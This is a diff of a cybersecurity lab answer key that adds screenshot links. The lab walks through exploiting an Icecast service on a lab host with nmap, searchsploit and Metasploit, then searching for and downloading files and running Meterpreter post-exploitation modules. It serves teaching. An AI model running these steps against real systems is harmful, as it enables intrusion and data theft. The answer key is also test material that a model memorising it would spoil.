@@ -59,6 +59,7 @@ You've been provided full access to the network and are getting ping responses f
     - Run the Nmap command that performs a service and version scan against the target.
 
       > Answer: nmap -sV 192.168.0.20
+      > ![](Images/nmap.png)
  
  
 2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
@@ -66,13 +67,14 @@ You've been provided full access to the network and are getting ping responses f
    - Run the SearchSploit commands to show available Icecast exploits.
   
      > Answer: `searchsploit icecast`
+     > ![](Images/searchsploit_icecast.png)
 
 3. Now that we know which exploits are available to us, let's start Metasploit:
  
    - Run the command that starts Metasploit:
     
       > Answer: `msfconsole`
- 
+![](Images\msfconsole.png) 
  
 4. Search for the Icecast module and load it for use.
  
@@ -88,7 +90,6 @@ You've been provided full access to the network and are getting ping responses f
      > Answer: `use exploit/windows/http/icecast_header`
      > Answer: `use 0`
  
- 
 5. Set the `RHOST` to the target machine.
  
    - Run the command that sets the `RHOST`:
@@ -101,13 +102,16 @@ You've been provided full access to the network and are getting ping responses f
       
      > Answer: exploit
      > Answer: run 
- 
+  
+  ![](Images/searchicecast.png)
+  
    - Run the command that performs a search for the `secretfile.txt` on the target.
       
      > Answer: `dir *secretfile.txt* /s /p`
 
         Found C:\Users\IEUser\Documents\user.secretfile.txt
-    
+        
+     ![](Images/secretfile.png)
   
  7. You should now have a Meterpreter session open.
  
@@ -116,13 +120,15 @@ You've been provided full access to the network and are getting ping responses f
       > Answer: `dir *recipe.txt* /s /p`
       
         Found C:\Users\IEUser\Documents\Drinks.recipe.txt
- 
+     
+     ![](Images/find_recipe.png)
  
     - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:
 
 
       > Answer: `download Users/IEUser/Documents/Drinks.recipe.txt`
  
+    ![](Images/download_recipes.png)
 
 8. You can also use Meterpreter's local exploit suggester to find possible exploits.
 
@@ -142,6 +148,8 @@ You've been provided full access to the network and are getting ping responses f
 A. Run a Meterpreter post script that enumerates all logged on users.
 
   > Answer: `run post/windows/gather/enum_logged_on_users`
+  
+  ![](Image/enum_users.png)
  
      
 B. Open a Meterpreter shell and gather system information for the target.
@@ -149,11 +157,13 @@ B. Open a Meterpreter shell and gather system information for the target.
   > Answer: 
   `shell`
   `systeminfo`
+  
+  ![](Images/systeminfo.png)
  
 C. Run the command that displays the target's computer system information:
 
    > Answer: `sysinfo`
-
+ ![](Images/sysinfo.png)
 
 ---
 
